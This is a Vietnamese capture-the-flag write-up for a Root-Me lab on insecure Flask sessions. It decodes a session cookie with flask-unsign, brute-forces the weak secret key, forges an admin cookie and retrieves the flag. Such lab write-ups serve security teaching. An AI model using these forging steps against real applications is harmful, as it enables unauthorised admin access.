# Flask - Unsecure Session

**Tên challenge:**  Sign Or Unsign

**Link challenge:** [Here](https://www.root-me.org/en/Challenges/Web-Server/Flask-Unsecure-session)

**Tác giả challenge:** Sanlokii

**Mục tiêu challenge:** Flask-me’s web developer tells you that using a strong secret key is useless. Prove him wrong !

**Tác giả Writeup:** Shino

---

# Bài giải

**B1:** Đầu tiên, Website có giao diện như sau:

![alt text](./images/image.png)

Sau khi thử từng chỉ mục trên thì chỉ có chỉ mục `ADMIN` hoặc nhấn vào nút `Admin Console` ở trang `HOME` sẽ chuyển ta sang endpoint `/admin`:

![alt text](./images/image-1.png)

Ta Click thử 3 chức năng bên trong `/admin` cũng chẳng có tác dụng gì và nút `Back Home` thì chuyển hướng ta về lại trang `HOME`.

Lúc này khi ta xem lại gói tin `/` thì ta phát hiện ta được cấp 1 **Session** có dạng như sau:
```
eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Z2k2dg.RNDEAoQt_xE4_rH80GFEmpMvhyE
```

**B2:** Ta thử `Decode Session` trên bằng tool [Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)
 
```
$> flask-unsign --decode --cookie '.eJwtybERgDAIAMBdskAChiBuA4TYWBk7z921sPu7v9MMP-NK24-ZGVXAYSEpjcG1wGCPWjs7gXwANERlohXMXEYrzcOgf8taLY9D9_S8w5kaRw.Z1Uacg.J0f1b_gkX_qDI8ThkONnFMa6EmA'

{'admin': 'false', 'username': 'guest'}
```

=> Vậy là mục tiêu kế tiếp của ta là thay đổi giá trị `admin` từ `false -> true`.

Nhưng trước tiên, ta phải cần tìm được `Secret Key` nếu muốn giả mạo chữ ký.

**B3:** Ta tiếp tục dùng tool trên để Brute-force `Secret Key`
```
$> flask-unsign --unsign --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.Z2k2dg.RNDEAoQt_xE4_rH80GFEmpMvhyE'

[*] Session decodes to: {'admin': 'false', 'username': 'guest'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----ECR
[+] Found secret key after 20480 attemptsskecret keyk
's3cr3t'
```

**Lưu ý:** Nếu bạn chạy gặp lỗi thì do bạn chưa cài [Flask Unsign Wordlist](https://github.com/Paradoxis/Flask-Unsign-Wordlist) vì câu lệnh trên sẽ dùng **Wordlists Default** trong `Flask-unsign` với điều kiện `wordlists` phải được cài đặt cùng với tool.

**B4:** Tiếp theo, ta sẽ dùng `Secret Key` vừa tìm được để tạo Session mới cho ta:
```
$> flask-unsign --sign --cookie "{'admin': 'true', 'username': 'guest'}" --secret 's3cr3t'

eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Z2k8hQ.c6WBKjGYGi-tUjuHxqINECxrUFM
```

**B5:** Ta bắt lại gói tin `/admin`, thay **Session** trên và ta sẽ lấy được `Flag`:

![alt text](./images/image-2.png)

=> Vậy là ta đã thành công lấy được `Flag`.
